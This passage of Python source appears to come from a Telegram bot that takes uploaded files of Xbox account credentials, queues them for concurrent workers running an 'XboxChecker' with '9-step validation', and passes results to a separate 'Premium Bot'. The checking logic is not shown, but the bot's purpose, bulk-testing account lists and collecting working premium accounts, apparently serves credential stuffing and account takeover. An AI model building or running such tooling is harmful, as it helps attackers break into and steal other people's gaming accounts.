        await update.message.reply_text(f"❌ No valid accounts in {doc.file_name}")
        os.remove(temp_path)
        return
    
    # Add to queue
    task_id = queue_manager.add_task(temp_path, doc.file_name, doc.file_id, user_id)
    stats = queue_manager.get_stats()
    
    await update.message.reply_text(
        f"✅ **File Accepted**\n"
        f"══════════════════\n\n"
        f"📄 `{doc.file_name}`\n"
        f"🔢 Accounts: {len(lines)}\n"
        f"📊 Task ID: `#{task_id}`\n"
        f"⚡ Active Workers: {stats['active']}/{stats['max_workers']}\n"
        f"⏳ Queue Position: {stats['pending']}\n\n"
        f"🔄 Your file will be processed by the ORIGINAL Xbox checker (9-step validation)",
        parse_mode='Markdown'
    )

# ============================================================
# MAIN
# ============================================================

app = None

async def main():
    global app
    
    init_db()
    clear_cancelled_tasks()
    
    app = Application.builder().token(MAIN_BOT_TOKEN).build()
    
    # Command handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("status", status_cmd))
    app.add_handler(CommandHandler("queue", queue_cmd))
    app.add_handler(CommandHandler("active", active_cmd))
    app.add_handler(CommandHandler("cancel", cancel_cmd))
    app.add_handler(CommandHandler("cancel_all", cancel_all_cmd))
    app.add_handler(CommandHandler("pause", pause_cmd))
    app.add_handler(CommandHandler("resume", resume_cmd))
    app.add_handler(CommandHandler("workers", workers_cmd))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    # Start worker controller
    asyncio.create_task(worker_controller())
    
    print("\n" + "="*70)
    print("🎮 XBOX PREMIUM CHECKER BOT - ORIGINAL CODE INTEGRATED")
    print("="*70)
    print(f"Main Bot: {MAIN_BOT_TOKEN[:15]}...")
    print(f"Premium Bot: {PREMIUM_BOT_TOKEN[:15]}...")
    print(f"Max Workers: {MAX_CONCURRENT_WORKERS} (files at once)")
    print("✓ Your original XboxChecker class (9-step validation)")
    print("✓ Your original TelegramSender class (aesthetic formatting)")
    print("✓ Multi-worker queue for stacking 100+ files")
    print("✓ All commands working")
    print("="*70 + "\n")
    
    await app.initialize()
    await app.start()
    await app.updater.start_polling()
    
    try:
        await asyncio.Event().wait()
    except KeyboardInterrupt:
        pass
    finally:
        await app.stop()

if __name__ == "__main__":
    asyncio.run(main())
